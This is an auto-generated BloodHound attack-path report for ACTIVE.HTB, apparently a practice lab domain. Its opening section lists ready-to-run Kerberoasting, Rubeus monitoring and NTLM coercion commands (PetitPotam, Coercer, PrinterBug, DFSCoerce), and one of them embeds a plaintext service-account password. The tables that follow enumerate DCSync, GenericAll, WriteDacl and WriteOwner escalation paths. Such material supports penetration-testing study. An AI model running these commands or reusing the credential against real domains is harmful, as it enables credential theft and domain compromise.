# BloodHound Enhanced Report

**Generated:** 2025-12-18 20:26:50

---

## Data Inventory

**Domains:** ACTIVE.HTB

| Type | Count | Details |
|------|-------|---------|
| Users | 6 | 2 enabled |
| Computers | 1 | DC.ACTIVE.HTB |
| Groups | 41 | ACCOUNT OPERATORS@ACTIVE.HTB, ADMINISTRATORS@ACTIVE.HTB, BACKUP OPERATORS@ACTIVE.HTB |

**Relationships:** GenericAll: 117 | WriteDacl: 107 | MemberOf: 33 | DCSync: 5 | AdminTo: 3

## Attack Commands

## Attack Commands

### Quick Wins

### impacket-GetUserSPNs - Kerberoasting Attack 

**Objective:** Request and extract TGS-REP hashes for service accounts (Kerberoasting)
**Rewards:** Kerberoast - request TGS for offline cracking
**Template:** `impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:"<PASSWORD>"`
**Example:** `impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/meg:"VimForPowerShell123!"`
**Need:** <PASSWORD>
**Requires:** Any authenticated domain user

| Discovered | Domain | Warnings | Info | Ready Command |
|------|--------|----------|--------|---------------|
| ADMINISTRATOR@ACTIVE.HTB | ACTIVE.HTB |  | Kerberoast - request TGS for offline cracking | `impacket-GetUserSPNs -request -dc-ip DC01.ACTIVE.HTB active.htb/SVC_TGS:"GPPstillStandingStrong2k18"` |

### Rubeus - Monitor for TGTs (Unconstrained Delegation) 

**Objective:** Monitor for incoming TGTs on unconstrained delegation host
**Rewards:** Unconstrained delegation - monitor for TGT capture
**Template:** `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>`
**Example:** `Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$`
**Need:** <TARGET_USER>
**Requires:** Local admin on unconstrained delegation host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
|  | DC.ACTIVE.HTB |  | Unconstrained delegation - monitor for TGT capture | `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>` |

### Lateral Movement

### PetitPotam - Coerce NTLM Authentication [CoerceToTGT]

**Objective:** Force target machine to authenticate to attacker using EfsRpcOpenFileRaw
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 PetitPotam.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' <LISTENER_IP> <TARGET_IP>`
**Example:** `python3 PetitPotam.py -u 'user' -p '<PASSWORD>' -d 'corp.local' 192.168.50.100 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC.ACTIVE.HTB | ACTIVE.HTB |  | DC.ACTIVE.HTB can coerce ACTIVE auth to capture TGT | `python3 PetitPotam.py -u '<USERNAME>' -p '<PASSWORD>' -d 'active.htb' None ACTIVE.HTB` |

### Coercer - Multi-Protocol Authentication Coercion [CoerceToTGT]

**Objective:** Test multiple coercion methods (MS-RPRN, MS-EFSR, MS-FSRVP, etc.)
**Rewards:** Coerce authentication to capture TGT
**Template:** `coercer coerce -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -l <LISTENER_IP> -t <TARGET_IP>`
**Example:** `coercer coerce -u 'user' -p '<PASSWORD>' -d 'corp.local' -l 192.168.50.100 -t 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC.ACTIVE.HTB | ACTIVE.HTB |  | DC.ACTIVE.HTB can coerce ACTIVE auth to capture TGT | `coercer coerce -u '<USERNAME>' -p '<PASSWORD>' -d 'active.htb' -l None -t ACTIVE.HTB` |

### PrinterBug/SpoolSample - Trigger Print Spooler Coercion [CoerceToTGT]

**Objective:** Force target to authenticate using MS-RPRN (Print Spooler)
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 printerbug.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>' <LISTENER_IP>`
**Example:** `python3 printerbug.py 'corp.local/user:<PASSWORD>@192.168.50.70' 192.168.50.100`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC.ACTIVE.HTB | ACTIVE.HTB |  | DC.ACTIVE.HTB can coerce ACTIVE auth to capture TGT | `python3 printerbug.py 'active.htb/<USERNAME>:<PASSWORD>@ACTIVE.HTB' None` |

### DFSCoerce - Trigger DFS Coercion [CoerceToTGT]

**Objective:** Force target to authenticate using MS-DFSNM (DFS)
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 dfscoerce.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' <LISTENER_IP> <TARGET_IP>`
**Example:** `python3 dfscoerce.py -u 'user' -p '<PASSWORD>' -d 'corp.local' 192.168.50.100 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC.ACTIVE.HTB | ACTIVE.HTB |  | DC.ACTIVE.HTB can coerce ACTIVE auth to capture TGT | `python3 dfscoerce.py -u '<USERNAME>' -p '<PASSWORD>' -d 'active.htb' None ACTIVE.HTB` |

---

## Quick Wins

### ⚪ AS-REP Roastable Users
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Kerberoastable Service Accounts
**OSCP Relevance:** HIGH | **Results:** 1

> Find users with Service Principal Names (SPNs). These can be Kerberoasted to obtain TGS hashes for offline cracking.

| ServiceAccount | SPNs | IsPrivileged | Description |
| --- | --- | --- | --- |
| ADMINISTRATOR@ACTIVE.HTB | ['active/CIFS:445'] | True | Built-in account for administering the computer/domain |

### ✅ High-Value Kerberoastable (Privileged + SPN)
**OSCP Relevance:** HIGH | **Results:** 1

> Find privileged users with SPNs. Cracking these provides immediate privilege escalation.

| HighValueTarget | SPNs | Description |
| --- | --- | --- |
| ADMINISTRATOR@ACTIVE.HTB | ['active/CIFS:445'] | Built-in account for administering the computer/domain |

### ✅ Unconstrained Delegation Systems
**OSCP Relevance:** HIGH | **Results:** 1

> Find computers with unconstrained delegation enabled. These can be abused to capture TGTs from authenticating users (printer bug, coercion attacks).

| Computer | ComputerIP | OS | Description |
| --- | --- | --- | --- |
| DC.ACTIVE.HTB |  | Windows Server 2008 R2 Standard Service Pack 1 |  |

### ⚪ Constrained Delegation Principals
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Users with Passwords in Description
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Accounts with Password Never Expires
**OSCP Relevance:** MEDIUM | **Results:** 2

> Find accounts with non-expiring passwords. Often service accounts with weak passwords or credentials in documentation.

| User | IsPrivileged | Description |
| --- | --- | --- |
| ADMINISTRATOR@ACTIVE.HTB | True | Built-in account for administering the computer/domain |
| SVC_TGS@ACTIVE.HTB | False |  |

### ⚪ Accounts That Never Logged In
**OSCP Relevance:** MEDIUM | **Results:** None

### ⚪ Computers Without LAPS
**OSCP Relevance:** MEDIUM | **Results:** None

### ✅ Pre-Windows 2000 Compatible Access Accounts
**OSCP Relevance:** LOW | **Results:** 1

> Find computers in Pre-Windows 2000 Compatible Access group. Legacy compatibility may expose vulnerabilities.

| Member | Type | ViaGroup |
| --- | --- | --- |
| AUTHENTICATED USERS@ACTIVE.HTB | ['Group', 'Base'] | PRE-WINDOWS 2000 COMPATIBLE ACCESS@ACTIVE.HTB |

### ⚪ ReadGMSAPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ ReadLAPSPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ All gMSA Accounts
**OSCP Relevance:** HIGH | **Results:** None

---

## Lateral Movement

### ⚪ Non-DA Users with Local Admin on Workstations
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ All Local Admins per Computer
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ PSRemote Access (Evil-WinRM Targets)
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ RDP Access Targets
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ DCOM Execution Rights
**OSCP Relevance:** MEDIUM | **Results:** None

### Sessions on Specific Computer
*Skipped - requires variables: COMPUTER*

### All Computer Access for Specific User
*Skipped - requires variables: USER*

### All Users Who Can Access Specific Computer
*Skipped - requires variables: COMPUTER*

### ⚪ Computers Where Domain Users Are Local Admin
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Computers with Multiple Admin Paths
**OSCP Relevance:** MEDIUM | **Results:** None

### ⚪ Workstations with Domain Admin Sessions
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Cross-Trust Lateral Movement
**OSCP Relevance:** MEDIUM | **Results:** None

### ✅ Coercion Targets (Unconstrained Delegation)
**OSCP Relevance:** HIGH | **Results:** 1

> Find computers with unconstrained delegation that can capture TGTs via coercion attacks (PetitPotam, PrinterBug, DFSCoerce). Coerce a DC to authenticate to these systems to capture its TGT.

| CoercionHost | CoercionHostIP | OS | CanCaptureTGTFrom | TargetType |
| --- | --- | --- | --- | --- |
| DC.ACTIVE.HTB |  | Windows Server 2008 R2 Standard Service Pack 1 | ACTIVE.HTB | ['Base', 'Domain', 'Tag_Tier_Zero'] |

### ⚪ SID History Abuse Paths
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Domain Trust Relationships
**OSCP Relevance:** HIGH | **Results:** None

---

## Privilege Escalation

### ✅ DCSync Rights
**OSCP Relevance:** HIGH | **Results:** 6

> Find principals with DCSync rights (GetChanges + GetChangesAll on Domain). Can perform secretsdump.py to extract all domain hashes.

| Principal | Type | Right |
| --- | --- | --- |
| DOMAIN CONTROLLERS@ACTIVE.HTB | ['Base', 'OU', 'Tag_Tier_Zero'] | GetChangesAll |
| ADMINISTRATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChangesAll |
| DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChangesAll |
| ENTERPRISE DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChanges |
| ADMINISTRATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChanges |
| ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] | GetChanges |

### ✅ GenericAll on High-Value Targets
**OSCP Relevance:** HIGH | **Results:** 17

> Find principals with GenericAll (full control) over privileged users, groups, or computers. Can reset passwords, modify group memberships, etc.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| ENTERPRISE ADMINS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DNSADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ACCOUNT OPERATORS@ACTIVE.HTB | DNSADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DNSADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] |
| ACCOUNT OPERATORS@ACTIVE.HTB | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN GUESTS@ACTIVE.HTB | ['Group', 'Base'] |
| ACCOUNT OPERATORS@ACTIVE.HTB | DOMAIN GUESTS@ACTIVE.HTB | ['Group', 'Base'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DOMAIN GUESTS@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN USERS@ACTIVE.HTB | ['Group', 'Base'] |
| ACCOUNT OPERATORS@ACTIVE.HTB | DOMAIN USERS@ACTIVE.HTB | ['Group', 'Base'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DOMAIN USERS@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN COMPUTERS@ACTIVE.HTB | ['Group', 'Base'] |
| ACCOUNT OPERATORS@ACTIVE.HTB | DOMAIN COMPUTERS@ACTIVE.HTB | ['Group', 'Base'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DOMAIN COMPUTERS@ACTIVE.HTB | ['Group', 'Base'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Base', 'OU', 'Tag_Tier_Zero'] |

### ⚪ Shadow Admins (Control over DA Users)
**OSCP Relevance:** HIGH | **Results:** None

### ✅ WriteDacl Abuse Paths
**OSCP Relevance:** HIGH | **Results:** 54

> Find principals with WriteDacl on high-value targets. Can grant themselves GenericAll then escalate further.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | ENTERPRISE ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | ADMINISTRATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | ADMINSDHOLDER@ACTIVE.HTB | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | ADMINSDHOLDER@ACTIVE.HTB | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | ADMINSDHOLDER@ACTIVE.HTB | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | DNSADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] |
| ADMINISTRATORS@ACTIVE.HTB | READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] |
| ADMINISTRATORS@ACTIVE.HTB | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | ACCOUNT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | ACCOUNT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | ACCOUNT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | SERVER OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | SERVER OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | SERVER OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | DOMAIN GUESTS@ACTIVE.HTB | ['Group', 'Base'] |
| ADMINISTRATORS@ACTIVE.HTB | DOMAIN USERS@ACTIVE.HTB | ['Group', 'Base'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DOMAIN ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | DOMAIN ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | ENTERPRISE ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | ENTERPRISE ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | SCHEMA ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | SCHEMA ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | SCHEMA ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | DOMAIN COMPUTERS@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | REPLICATOR@ACTIVE.HTB | ['Group', 'Base'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | REPLICATOR@ACTIVE.HTB | ['Group', 'Base'] |
| ADMINISTRATORS@ACTIVE.HTB | REPLICATOR@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | BACKUP OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | BACKUP OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | BACKUP OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | PRINT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | PRINT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | PRINT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | ADMINISTRATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | ADMINISTRATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DEFAULT DOMAIN CONTROLLERS POLICY@ACTIVE.HTB | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DEFAULT DOMAIN CONTROLLERS POLICY@ACTIVE.HTB | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DEFAULT DOMAIN POLICY@ACTIVE.HTB | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DEFAULT DOMAIN POLICY@ACTIVE.HTB | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | KRBTGT@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | KRBTGT@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | KRBTGT@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | ADMINISTRATOR@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | ADMINISTRATOR@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | ADMINISTRATOR@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |

### ✅ WriteOwner Abuse Paths
**OSCP Relevance:** HIGH | **Results:** 54

> Find principals with WriteOwner on targets. Can take ownership, then WriteDacl, then GenericAll.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| ADMINISTRATORS@ACTIVE.HTB | DOMAIN COMPUTERS@ACTIVE.HTB | ['Group', 'Base'] |
| ADMINISTRATORS@ACTIVE.HTB | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] |
| ADMINISTRATORS@ACTIVE.HTB | SCHEMA ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | DNSADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] |
| ADMINISTRATORS@ACTIVE.HTB | ADMINSDHOLDER@ACTIVE.HTB | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | DOMAIN USERS@ACTIVE.HTB | ['Group', 'Base'] |
| ADMINISTRATORS@ACTIVE.HTB | REPLICATOR@ACTIVE.HTB | ['Group', 'Base'] |
| ADMINISTRATORS@ACTIVE.HTB | PRINT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | ACCOUNT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | KRBTGT@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | ADMINISTRATOR@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DEFAULT DOMAIN POLICY@ACTIVE.HTB | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DEFAULT DOMAIN CONTROLLERS POLICY@ACTIVE.HTB | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | ACCOUNT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | SERVER OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | REPLICATOR@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] |
| DOMAIN ADMINS@ACTIVE.HTB | PRINT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | BACKUP OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | ADMINISTRATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | SCHEMA ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | ENTERPRISE ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | ADMINSDHOLDER@ACTIVE.HTB | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | REPLICATOR@ACTIVE.HTB | ['Group', 'Base'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | KRBTGT@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | ADMINISTRATOR@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DEFAULT DOMAIN CONTROLLERS POLICY@ACTIVE.HTB | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DEFAULT DOMAIN POLICY@ACTIVE.HTB | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | BACKUP OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | READ-ONLY DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | PRINT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | ADMINSDHOLDER@ACTIVE.HTB | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | ADMINISTRATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DOMAIN ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | SCHEMA ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | SERVER OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | ACCOUNT OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | ENTERPRISE ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | ADMINISTRATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | ADMINISTRATOR@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | KRBTGT@ACTIVE.HTB | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | DOMAIN ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | ENTERPRISE ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | DOMAIN CONTROLLERS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | SERVER OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@ACTIVE.HTB | DOMAIN GUESTS@ACTIVE.HTB | ['Group', 'Base'] |
| ADMINISTRATORS@ACTIVE.HTB | BACKUP OPERATORS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |

### ⚪ AddKeyCredentialLink (Shadow Credentials)
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ ForceChangePassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ AddMember to Privileged Groups
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Owns Relationships on Users/Groups
**OSCP Relevance:** HIGH | **Results:** 21

> Find principals who own other users or groups. Owner can grant themselves full control.

| Owner | OwnedObject | ObjectType |
| --- | --- | --- |
| DOMAIN ADMINS@ACTIVE.HTB | DOMAIN ADMINS@ACTIVE.HTB | ['Group', 'Base', 'Tag_Tier_Zero'] |
